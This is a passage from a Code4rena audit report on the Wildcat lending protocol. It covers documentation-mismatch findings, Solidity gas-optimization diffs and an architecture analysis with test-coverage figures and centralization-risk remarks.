
### Issue Description

The whitepaper states that "Vaults query a specified controller to determine who can interact." However, the interaction rights are set by the controller on the market. There is no callback from the market to the controller, except for the initial call of the lender when authorization is null. The whitepaper should be updated to align with the actual code implementation.

### Recommended Mitigation Steps

Update the documentation to describe the functionality as it exists in the code.

## [N-04] Incorrect documentation of `registerControllerFactory()`

[WildcatArchController Line 106](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatArchController.sol#L106)

### Issue Description

The documentation in the [GitBook](https://wildcat-protocol.gitbook.io/wildcat/technical-deep-dive/component-overview/wildcatarchcontroller.sol) states that the function `registerControllerFactory()` only reverts if "The controller factory has already been registered." This is inaccurate because the function also uses the `onlyOwner()` modifier, which causes it to revert if called by someone other than the owner.

### Recommended Mitigation Steps

Revise the documentation to include the statement "Called by someone other than the owner."

## [N-05] Incorrect documentation of `removeControllerFactory()`

[WildcatArchController Line 113](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatArchController.sol#L113)

### Issue Description

The documentation in the [GitBook](https://wildcat-protocol.gitbook.io/wildcat/technical-deep-dive/component-overview/wildcatarchcontroller.sol) states that the function `removeControllerFactory()` only reverts if "The controller factory address does not exist or has been removed." This is not entirely accurate, as the function also employs the `onlyOwner()` modifier, causing it to revert if called by someone other than the owner.

### Recommended Mitigation Steps

Update the documentation to include the statement "Called by someone other than the owner."

## [N-06] Documentation of the functions is missing

### Issue Description

The [GitBook](https://wildcat-protocol.gitbook.io/wildcat/technical-deep-dive/component-overview/wildcatarchcontroller.sol) documentation lists numerous functions in the component overview section that lack descriptions. This omission can make it challenging for users and developers to understand the purpose and usage of these functions.

### Recommended Mitigation Steps

Provide descriptions for the missing functions in the documentation to enhance clarity and understanding.

## [N-07] Incorrect comment in `_depositBorrowWithdraw()`

[BaseMarketTest Line 71](https://github.com/code-423n4/2023-10-wildcat/blob/main/test/BaseMarketTest.sol#L71)

### Issue Description

Inside the function, the comments state that 80% of the market assets get borrowed and 100% of withdrawal get withdrawn. This is not the case, as instead, the provided parameters `depositAmount`, `borrowAmount` and `withdrawalAmount` are used. There are no `require`` statements in the function that check for these requirements; 80%/100% being fulfilled by the parameters.

### Recommended Mitigation Steps

To address this issue, consider either adding `require` statements to verify that the parameters adhere to the stated percentages, or remove the comments if they no longer apply to the functionality.

**[laurenceday (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/581#issuecomment-1794449659)**

**[0xTheC0der (judge) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/581#issuecomment-1804138282):**
 > L-03 seems intended; therefore, considered Non-Critical.

***

# Gas Optimizations

For this audit, 11 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-10-wildcat-findings/issues/168) by **nisedo** received the top score from the judge.

*The following wardens also submitted reports: [JCK](https://github.com/code-423n4/2023-10-wildcat-findings/issues/701), [hunter\_w3b](https://github.com/code-423n4/2023-10-wildcat-findings/issues/723), [Raihan](https://github.com/code-423n4/2023-10-wildcat-findings/issues/716), [petrichor](https://github.com/code-423n4/2023-10-wildcat-findings/issues/715), [0xAnah](https://github.com/code-423n4/2023-10-wildcat-findings/issues/695), [shamsulhaq123](https://github.com/code-423n4/2023-10-wildcat-findings/issues/687), [0xhex](https://github.com/code-423n4/2023-10-wildcat-findings/issues/680), [SAQ](https://github.com/code-423n4/2023-10-wildcat-findings/issues/673), [0xta](https://github.com/code-423n4/2023-10-wildcat-findings/issues/661), and [0xVolcano](https://github.com/code-423n4/2023-10-wildcat-findings/issues/587).*

*Note: All gas optimization estimations presented in this report have been determined using the `forge snapshot` feature. This tool allows for a precise analysis of gas consumption before and after the proposed changes, ensuring the accuracy of the savings mentioned.*

## [G-01] State variables that are used multiple times in a function should be cached in stack variables

By caching state variables in stack variables, we reduce the need to frequently access storage, thereby saving gas.

```diff
File: WildcatSanctionsEscrow.sol
  function releaseEscrow() public override {
    if (!canReleaseEscrow()) revert CanNotReleaseEscrow();

    uint256 amount = balance();
    
+   address _account = account;
+   address _asset = asset;

-   IERC20(asset).transfer(account, amount);
+   IERC20(_asset).transfer(_account, amount);

-   emit EscrowReleased(account, asset, amount);
+   emit EscrowReleased(_account, _asset, amount);
  }
```

Overall gas change: `-194421 (-0.230%)`

## [G-02] Pack struct variables

Reordering the structure of the `MarketState` ensures that the struct variables are packed efficiently, minimizing storage costs.

```solidity
File: MarketState.sol
	struct MarketState {
		uint128 maxTotalSupply;                 // 16 bytes
		uint128 accruedProtocolFees;            // 16 bytes

		uint128 normalizedUnclaimedWithdrawals; // 16 bytes
		uint104 scaledTotalSupply;              // 13 bytes
		uint16 annualInterestBips;              // 2 bytes
		bool isClosed;                          // 1 byte
		
		uint104 scaledPendingWithdrawals;       // 13 bytes
		uint112 scaleFactor;                    // 14 bytes
		uint16 reserveRatioBips;                // 2 bytes
		bool isDelinquent;                      // 1 byte

		uint32 pendingWithdrawalExpiry;         // 4 bytes
		uint32 timeDelinquent;                  // 4 bytes
		uint32 lastInterestAccruedTimestamp;    // 4 bytes
	}
```

## [G-03] `WildcatMarket.closeMarket()` function can be optimized

By moving condition checks up in the execution flow, we save on computational steps and improve the gas efficiency of the `closeMarket()` function.

```diff
File: WildcatMarket.sol
  function closeMarket() external onlyController nonReentrant {
    MarketState memory state = _getUpdatedState();
+    if (_withdrawalData.unpaidBatches.length() > 0) {
+      revert CloseMarketWithUnpaidWithdrawals();
+    }
    state.annualInterestBips = 0;
    state.isClosed = true;
    state.reserveRatioBips = 0;
-    if (_withdrawalData.unpaidBatches.length() > 0) {
-      revert CloseMarketWithUnpaidWithdrawals();
-    }
    uint256 currentlyHeld = totalAssets();
    uint256 totalDebts = state.totalDebts();
    if (currentlyHeld < totalDebts) {
      // Transfer remaining debts from borrower
      asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld);
    } else if (currentlyHeld > totalDebts) {
      // Transfer excess assets to borrower
      asset.safeTransfer(borrower, currentlyHeld - totalDebts);
    }
    _writeState(state);
    emit MarketClosed(block.timestamp);
  }
```

Overall gas change: `-1524 (-0.002%)`

## [G-04] `WildcatMarketConfig.setAnnualInterestBips()` function can be optimized

By moving condition checks up in the execution flow, we save on computational steps and improve the gas efficiency of the `setAnnualInterestBips()` function.

```solidity
File: WildcatMarketConfig.sol
  function setAnnualInterestBips(uint16 _annualInterestBips) public onlyController nonReentrant {
+   if (_annualInterestBips > BIP) {
+     revert InterestRateTooHigh();
+   }
    MarketState memory state = _getUpdatedState();

-   if (_annualInterestBips > BIP) {
-     revert InterestRateTooHigh();
-   }

    state.annualInterestBips = _annualInterestBips;
    _writeState(state);
    emit AnnualInterestBipsUpdated(_annualInterestBips);
  }
```

Overall gas change: `-7567 (-0.009%)`

## [G-05] `WildcatMarketConfig.stunningReversal()` function can be optimized

By moving condition checks up in the execution flow, we save on computational steps and improve the gas efficiency of the `stunningReversal()` function.

```diff
File: WildcatMarketConfig.sol
  function stunningReversal(address accountAddress) external nonReentrant {
+   if (IWildcatSanctionsSentinel(sentinel).isSanctioned(borrower, accountAddress)) {
+     revert NotReversedOrStunning();
+   }
    Account memory account = _accounts[accountAddress];
    if (account.approval != AuthRole.Blocked) {
      revert AccountNotBlocked();
    }

-   if (IWildcatSanctionsSentinel(sentinel).isSanctioned(borrower, accountAddress)) {
-     revert NotReversedOrStunning();
-   }


    account.approval = AuthRole.Null;
    emit AuthorizationStatusUpdated(accountAddress, account.approval);


    _accounts[accountAddress] = account;
  }
```

## [G-06] `WildcatMarketWithdrawals.queueWithdrawal()` function can be optimized

By moving condition checks up in the execution flow, we save on computational steps and improve the gas efficiency of the `queueWithdrawal()` function.

```diff
File: WildcatMarketWithdrawals.sol
  function queueWithdrawal(uint256 amount) external nonReentrant {
    MarketState memory state = _getUpdatedState();

+   uint104 scaledAmount = state.scaleAmount(amount).toUint104();
+   if (scaledAmount == 0) {
+     revert NullBurnAmount();
+   }

    // Cache account data and revert if not authorized to withdraw.
    Account memory account = _getAccountWithRole(msg.sender, AuthRole.WithdrawOnly);

-   uint104 scaledAmount = state.scaleAmount(amount).toUint104();
-   if (scaledAmount == 0) {
-     revert NullBurnAmount();
-   }


    // Reduce caller's balance and emit transfer event.
    account.scaledBalance -= scaledAmount;
    _accounts[msg.sender] = account;
    emit Transfer(msg.sender, address(this), amount);


    // If there is no pending withdrawal batch, create a new one.
    if (state.pendingWithdrawalExpiry == 0) {
      state.pendingWithdrawalExpiry = uint32(block.timestamp + withdrawalBatchDuration);
      emit WithdrawalBatchCreated(state.pendingWithdrawalExpiry);
    }
    // Cache batch expiry on the stack for gas savings.
    uint32 expiry = state.pendingWithdrawalExpiry;


    WithdrawalBatch memory batch = _withdrawalData.batches[expiry];


    // Add scaled withdrawal amount to account withdrawal status, withdrawal batch and market state.
    _withdrawalData.accountStatuses[expiry][msg.sender].scaledAmount += scaledAmount;
    batch.scaledTotalAmount += scaledAmount;
    state.scaledPendingWithdrawals += scaledAmount;


    emit WithdrawalQueued(expiry, msg.sender, scaledAmount);


    // Burn as much of the withdrawal batch as possible with available liquidity.
    uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());
    if (availableLiquidity > 0) {
      _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);
    }


    // Update stored batch data
    _withdrawalData.batches[expiry] = batch;


    // Update stored state
    _writeState(state);
  }
```

Overall gas change: `-9258 (-0.011%)`

## [G-07] `WildcatMarketWithdrawals.executeWithdrawal()` function can be optimized

By moving condition checks up in the execution flow, we save on computational steps and improve the gas efficiency of the `executeWithdrawal()` function.

```diff
File: WildcatMarketWithdrawals.sol
  function executeWithdrawal(
    address accountAddress,
    uint32 expiry
  ) external nonReentrant returns (uint256) {
    if (expiry > block.timestamp) {
      revert WithdrawalBatchNotExpired();
    }
    MarketState memory state = _getUpdatedState();


    WithdrawalBatch memory batch = _withdrawalData.batches[expiry];
    AccountWithdrawalStatus storage status = _withdrawalData.accountStatuses[expiry][
      accountAddress
    ];


    uint128 newTotalWithdrawn = uint128(
      MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount)
    );


    uint128 normalizedAmountWithdrawn = newTotalWithdrawn - status.normalizedAmountWithdrawn;

+   if (normalizedAmountWithdrawn == 0) {
+     revert NullWithdrawalAmount();
+   }

    status.normalizedAmountWithdrawn = newTotalWithdrawn;
    state.normalizedUnclaimedWithdrawals -= normalizedAmountWithdrawn;

-   if (normalizedAmountWithdrawn == 0) {
-     revert NullWithdrawalAmount();
-   }


    if (IWildcatSanctionsSentinel(sentinel).isSanctioned(borrower, accountAddress)) {
      _blockAccount(state, accountAddress);
      address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(
        accountAddress,
        borrower,
        address(asset)
      );
      asset.safeTransfer(escrow, normalizedAmountWithdrawn);
      emit SanctionedAccountWithdrawalSentToEscrow(
        accountAddress,
        escrow,
        expiry,
        normalizedAmountWithdrawn
      );
    } else {
      asset.safeTransfer(accountAddress, normalizedAmountWithdrawn);
    }


    emit WithdrawalExecuted(expiry, accountAddress, normalizedAmountWithdrawn);


    // Update stored state
    _writeState(state);


    return normalizedAmountWithdrawn;
  }
```

Overall gas change: `-413 (-0.070%)`

## [G-08] The function `MathUtils.calculateLinearInterestFromBips()` is duplicated and can be deleted

The function `calculateLinearInterestFromBips()` is duplicated in `FeeMath.sol` and `MathUtils.sol`. Removing the duplicated `calculateLinearInterestFromBips()` function in `MathUtils.sol` and using the one in `FeeMath.sol` eliminates redundancy and saves gas.

```solidity
File: FeeMath.sol
20:     function calculateLinearInterestFromBips(uint256 rateBip, uint256 timeDelta)
21:         internal
22:         pure
23:         returns (uint256 result)
24:     {
25:         uint256 rate = rateBip.bipToRay();
26:         uint256 accumulatedInterestRay = rate * timeDelta;
27:         unchecked {
28:             return accumulatedInterestRay / SECONDS_IN_365_DAYS;
29:         }
30:     }
```

```solidity
File: MathUtils.sol
30:     function calculateLinearInterestFromBips(
31:         uint256 rateBip,
32:         uint256 timeDelta
33:     ) internal pure returns (uint256 result) {
34:         uint256 rate = rateBip.bipToRay();
35:         uint256 accumulatedInterestRay = rate * timeDelta;
36:         unchecked {
37:             return accumulatedInterestRay / SECONDS_IN_365_DAYS;
38:         }
39:     }
```

The `MathUtils.calculateLinearInterestFromBips()` function can be deleted to save gas and optimize the code. Don't forget to update the references to the function in the code by replacing them with the `FeeMath.calculateLinearInterestFromBips()` function instead of `MathUtils.calculateLinearInterestFromBips()` function.

## [G-09] The function `MathUtils._applyWithdrawalBatchPayment()` can be optimized

By moving condition checks up in the execution flow, we save on computational steps and improve the gas efficiency of the `_applyWithdrawalBatchPayment()` function.

```diff
File: WildcatMarketBase.sol
  function _applyWithdrawalBatchPayment(
    WithdrawalBatch memory batch,
    MarketState memory state,
    uint32 expiry,
    uint256 availableLiquidity
  ) internal {
+   uint104 scaledAmountOwed = batch.scaledTotalAmount - batch.scaledAmountBurned;
+   // Do nothing if batch is already paid
+   if (scaledAmountOwed == 0) {
+     return;
+   }
    uint104 scaledAvailableLiquidity = state.scaleAmount(availableLiquidity).toUint104();
-   uint104 scaledAmountOwed = batch.scaledTotalAmount - batch.scaledAmountBurned;
-   // Do nothing if batch is already paid
-   if (scaledAmountOwed == 0) {
-     return;
-   }
    uint104 scaledAmountBurned = uint104(MathUtils.min(scaledAvailableLiquidity, scaledAmountOwed));
    uint128 normalizedAmountPaid = state.normalizeAmount(scaledAmountBurned).toUint128();


    batch.scaledAmountBurned += scaledAmountBurned;
    batch.normalizedAmountPaid += normalizedAmountPaid;
    state.scaledPendingWithdrawals -= scaledAmountBurned;


    // Update normalizedUnclaimedWithdrawals so the tokens are only accessible for withdrawals.
    state.normalizedUnclaimedWithdrawals += normalizedAmountPaid;


    // Burn market tokens to stop interest accrual upon withdrawal payment.
    state.scaledTotalSupply -= scaledAmountBurned;


    // Emit transfer for external trackers to indicate burn.
    emit Transfer(address(this), address(0), normalizedAmountPaid);
    emit WithdrawalBatchPayment(expiry, scaledAmountBurned, normalizedAmountPaid);
  }
```

Overall gas change: `-5380 (-0.006%)`

**[laurenceday (Wildcat) confirmed and commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/168#issuecomment-1794457601):**
 > This one is particularly helpful, appreciated!

*** 

# Audit Analysis

For this audit, 11 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-10-wildcat-findings/issues/704) by **rahul** received the top score from the judge.

*The following wardens also submitted reports: [ZdravkoHr](https://github.com/code-423n4/2023-10-wildcat-findings/issues/685), [0xSmartContract](https://github.com/code-423n4/2023-10-wildcat-findings/issues/654), [hunter\_w3b](https://github.com/code-423n4/2023-10-wildcat-findings/issues/482), [catellatech](https://github.com/code-423n4/2023-10-wildcat-findings/issues/248), [nirlin](https://github.com/code-423n4/2023-10-wildcat-findings/issues/714), [Sathish9098](https://github.com/code-423n4/2023-10-wildcat-findings/issues/462), [J4X](https://github.com/code-423n4/2023-10-wildcat-findings/issues/422), [invitedtea](https://github.com/code-423n4/2023-10-wildcat-findings/issues/395), [radev\_sw](https://github.com/code-423n4/2023-10-wildcat-findings/issues/206), and [InAllHonesty](https://github.com/code-423n4/2023-10-wildcat-findings/issues/112).*

## Analysis goal

The  Wildcat Protocol was analysed for common design flaws, such as access control, arithmetic issues, front-running, denial of service, race conditions, and protocol manipulations.  

The analysis specifically explored the following scenarios:
- Can borrowers bypass the whitelisting process?
- Can a lender claim another lender's deposits?
- Can a lender bypass whitelisting process?
- Does the market respond appropriately to change in capacity? 
- Does change in reserve ratio correctly trigger delinquency?
- Is penalty tracking working correctly?
- What happens to penalty before grace tracker cools down? Can there be an overlap?
- Is there a way to bypass range of parameters defined by controller?
- Confirm if reserve ratio is linked to supply everywhere.
- Is there any way to stop updates of market calculation from happening?
- Can the market be bricked?
- Can withdrawal cycle be bypassed?
- Can sanctioned wallet access the protocol? Bypass the restriction?
- Is the mechanism for burning market tokens working correctly? Especially if the withdrawals are queued?
- Can sanction overrides be abused?

Further, the code was reviewed to identify possible improvements. Appendix C briefly covers the methodology.

## Protocol overview

Unlike traditional finance, lending in DeFi is enabled by overcollateralization, given the absence of underlying trust in borrowers' creditworthiness. Wildcat protocol aims to create an undercollateralized, peer-to-peer, fixed-income market  (refer Appendix A for a primer on fixed-income markets) without dictating lending terms. 

Instead, Wildcat provides mechanisms to:
- legally verify borrowers,
- apply penalty rate for borrower delinquency, and 
- apply constraints on the borrower when dropping the APR rate.

The protocol entrusts borrowers to maintain the health of the markets by providing complete control of lending terms such as capacity, rates, underlying asset, penalty terms, withdrawal cycles, and so on.

Wildcat also provides optional, on-chain agreements lending agreements, and let the judicial system resolve legal disputes. By enabling lenders to trust the judicial system and, by proxy, the borrower, the protocol opens lending to a wide array of borrowers to access capital.

Fundamentally, wildcat works by allowing borrowers to deploy market via a preset controller and then authorizing lenders to participate. Lenders can deposit money to earn interest. Market is (under) collateralized by reserving some part of the supply. Violating reserve ratio requirement causes a market to become delinquent. 

![Wildcat architecture](https://i.imgur.com/5DfbrE4.png)

Appendix B lists the user roles for this protocol.

### Onboarding borrower

Borrowers interested in raising capital using the Wildcat protocol are vetted through an offline process before being added to the whitelist on `ArchController` - the registry that tracks permissions and deployments. Borrowers are then expected to follow the terms of the service agreement.

![Borrower onboarding](https://i.imgur.com/S36Awzu.png)

If a borrower is deboarded from the protocol they are still capable of interacting with existing markets.

### Anatomy of a market

A market is created with the following parameters by a whitelisted borrower via controller.  The borrower then authorizes preferred lenders who deposit funds into the market, which can be loaned by the borrower from the protocol.

![Anatomy of a market](https://i.imgur.com/pYhWymY.png)

### Withdrawal-claim cycle

If the market is sufficiently funded, then tokens are moved to unclaimed withdrawal pool and the supply is reduced by burning market tokens. Lenders can then claim tokens at the end of withdrawal cycle. If market does not have sufficient reserves to fulfill the withdrawal, the request is queued until borrower deposits tokens to cure the delinquency.

![Withdrawal](https://i.imgur.com/UqHO8n4.png)

## Comments on code

The codebase is well-written, and sufficiently tested. The documentation is clear and concise, and it provides helpful examples and explanations. The following comments point out possible areas for improvement:

### 1. Consider using hooks for managing temporary parameters

To optimize deployment costs as described below in section I-02 of this report, consider using hooks to perform preconditions and reset temporary parameters. This would provide a mechanism to clean up dynamic values before they are read by deployed contracts, making the code more readable and emphasizing the lifecycle of the deployment process. It would also centralize code related to the creation of markets and controllers, making it easier to extend the codebase if needed.

This is partially done in using `WildcatMarketControllerFactory._resetTmpMarketParameters`. A more generic approach could be:

```diff
  function deployController() public returns (address controller) {
    __SNIP__
-   _tmpMarketBorrowerParameter = msg.sender;
+   _onBeforeControllerDeployment();
    __SNIP__
    if (controller.codehash != bytes32(0)) {
      revert ControllerAlreadyDeployed();
    }
    LibStoredInitCode.create2WithStoredInitCode(controllerInitCodeStorage, salt);
-   _tmpMarketBorrowerParameter = address(1);
+   _onAfterControllerDeployment();
    archController.registerController(controller);
    _deployedControllers.add(controller);
  }

+ function _onBeforeControllerDeployment() internal{
+   // Add pre-conditions for creating controllers.
+   _tmpMarketBorrowerParameter = msg.sender;
+ }
+
+ function _onAfterControllerDeployment() internal{
+   _tmpMarketBorrowerParameter = address(1);
+   // Add necessary assertions to verify deployment.
+ }
```

[Source: src/WildcatMarketControllerFactory.sol#L282-L301](https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/WildcatMarketControllerFactory.sol#L282-L301)

### 2. Consider aligning documentation closer to code

The following parameter is named differently in the codebase and documentation. While both names are appropriate, using a consistent name in both locations would enhance the correlation between the specification and the code:

| **Parameter in documentation** | **Parameter in code** |
| ----------| -------- |
| Capacity | `maxTotalSupply` |
| Penalty APR | `delinquencyFee` |
| Withdrawal Cycle | `withdrawalBatchDuration` |

### 3. Centralize state variable declarations

Consider declaring the following state variables at one place, ideally at the top of the contract in a Solidity file. This has a number of benefits, including readability, maintainability, and in some cases, gas optimization.
- `src/WildcatMarketControllerFactory.sol`
	- `_tmpMarketBorrowerParameter`

[Source: src/WildcatMarketControllerFactory.sol#L244](https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/WildcatMarketControllerFactory.sol#L244)

### 4. Increase test coverage

Considering this protocol is designed to be non-upgradable, it is advice to increase test coverage.

**Ideal coverage (above 90%)**
- `src/WildcatArchController.sol` (100%)
- `src/WildcatSanctionsSentinel.sol` (100%)
- `src/WildcatSanctionsEscrow.sol` (100%)
- `src/libraries/FeeMath.sol` (100%)
- `src/libraries/FIFOQueue.sol` (100%)
- `src/libraries/MathUtils.sol` (100%)
- `src/libraries/SafeCastLib.sol` (100%)
- `src/libraries/Withdrawal.sol` (100%)
- `src/market/WildcatMarketToken.sol` (100%)
- `src/market/WildcatMarketWithdrawals.sol` (100%)
- `src/market/WildcatMarketConfig.sol` (98%)
- `src/market/WildcatMarket.sol` (96%)
- `src/WildcatMarketController.sol` (95%)
- `src/market/WildcatMarketBase.sol` (92%)

**High coverage (between 75% and 90%)**
- `src/libraries/LibStoredInitCode.sol` (88%)
- `src/libraries/MarketState.sol` (87%)
- `src/ReentrancyGuard.sol` (80%)

**Medium coverage (between 50% and 75%)**
- N/A

**Low coverage (below 50%)**
- `src/WildcatMarketControllerFactory.sol` (38%)
- `src/libraries/BoolUtils.sol` (0%)
- `src/libraries/Errors.sol` (0%)
- `src/libraries/StringQuery.sol` (0%)

At the very least, consider adding coverage for the following critical functions:
- `src/WildcatMarketControllerFactory.sol`
	- `deployController()`
	- `deployControllerAndMarket()`
- `src/libraries/MarketState.sol`
	- `totalDebts()`

### 5. Consider adding comments for critical components

The following functions would benefit from comments, because they employ novel ways to achieve their goals or play a pivotal role in critical operations. Adding a formal specification would also help document their objective:
- `src/libraries/LibStoredInitCode.sol`
	- `deployInitCode()`
	- `create2WithStoredInitCode()`

## Centralization risks

Wildcat is a permissioned protocol, which means that it is controlled by a central authority (the protocol operator). This gives the operator a great deal of power, including the ability to add new borrowers and manage critical fees. If the operator account is compromised, it could have serious consequences for the protocol, such as preventing new borrowers from joining or contaminating the list of borrowers.

To mitigate this risk, it is recommended that the team use a multi-signature wallet to manage the operator account. A multi-signature wallet requires multiple signatures from authorized users to authorize transactions. This makes it much more difficult for an attacker to compromise the account, even if they have access to one of the signatures.

## Highlights: Innovations and best practices 

### 1. Innovative use of `Create2` deployments

The cost of deploying the controller and market contracts is a bottleneck for this protocol. To save gas during deployment, the team uses a clever method of letting the controller and market contracts pull their centralized configuration from the controller factory instead of passing it to them as constructor arguments. `LibStoredInitCode.create2WithStoredInitCode` efficiently creates clones of these contracts.


```solidity
__SNIP__
    function deployController() public returns (address controller) {
        if (!archController.isRegisteredBorrower(msg.sender)) {
            revert NotRegisteredBorrower();
        }
        _tmpMarketBorrowerParameter = msg.sender;
        // Salt is borrower address
        bytes32 salt = bytes32(uint256(uint160(msg.sender)));
        controller = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, controllerInitCodeHash);
        if (controller.codehash != bytes32(0)) {
            revert ControllerAlreadyDeployed();
        }
        LibStoredInitCode.create2WithStoredInitCode(controllerInitCodeStorage, salt);
        _tmpMarketBorrowerParameter = address(1);
        archController.registerController(controller);
        _deployedControllers.add(controller);
    }
__SNIP__
```

[Source: src/WildcatMarketControllerFactory.sol#L282-L301](https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/WildcatMarketControllerFactory.sol#L282-L301)

[Source: src/libraries/LibStoredInitCode.sol#L99-L118](https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/libraries/LibStoredInitCode.sol#L99-L118)

### 2. Modular constraints

Throughout the codebase, constraints are broken down into modular units, instead of chaining them into one long statement. This greatly improves readability and the ability to test constraints individually.

An example:

```solidity
__SNIP__
    bool hasOriginationFee = originationFeeAmount > 0;
    bool nullFeeRecipient = feeRecipient == address(0);
    bool nullOriginationFeeAsset = originationFeeAsset == address(0);
    if (
      (protocolFeeBips > 0 && nullFeeRecipient) ||
      (hasOriginationFee && nullFeeRecipient) ||
      (hasOriginationFee && nullOriginationFeeAsset)
    ) {
      revert InvalidProtocolFeeConfiguration();
    }
 __SNIP__
```

[Source: /src/WildcatMarketControllerFactory.sol#L195-L217](https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/WildcatMarketControllerFactory.sol#L195-L217)

## Appendix A: Fixed-income markets

Fixed-income markets connect borrowers and lenders, allowing borrowers to raise capital from lenders over a specified period of time. Lenders are compensated for providing capital through regular interest payments (hence, the term "fixed-income" markets). However, there is a risk of delinquency from the borrower, which can mean that the lender does not receive all of the money they are owed.

Delinquency is when a borrower fails to make a payment on a loan. This can happen for a variety of reasons, such as financial hardship or fraud. When a borrower is delinquent, the lender may have to take legal action to recover the money.

For protocol specific terminology [refer this page](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/terminology).

## Appendix B: User roles

**Operator** - The wallet address that  deploys `Archcontroller`. In charge of whitelisting borrowers, and setting protocol configurations.

**Borrower** - Entity authorized by the protocol to deploy markets to use the credit facility.

**Lender** - Entity authorized by the borrower to deposit asset in a market. 

## Appendix C:  Methodology

Project evaluation is a two-part process: understanding and reviewing.

In the understanding phase, the project's background is deeply analyzed, including documentation, previous releases, and similar protocols. This helps to understand the project's core value, identify critical risks, assess user experiences, and evaluate security. Factors like test coverage are also considered.

In the review phase, the project's architecture is systematically assessed. Code duplication, inconsistencies, and areas for improvement are looked for. Best practices are recommended and optimizations are suggested. This comprehensive approach ensures that the project's overall structure and code quality are scrutinized for improvements.

### Time spent

63 hours

**[laurenceday (Wildcat) acknowledged and commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/704#issuecomment-1794472705):**
 > This one is excellent - I'd go so far as to ask to use the architecture diagram in the whitepaper.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
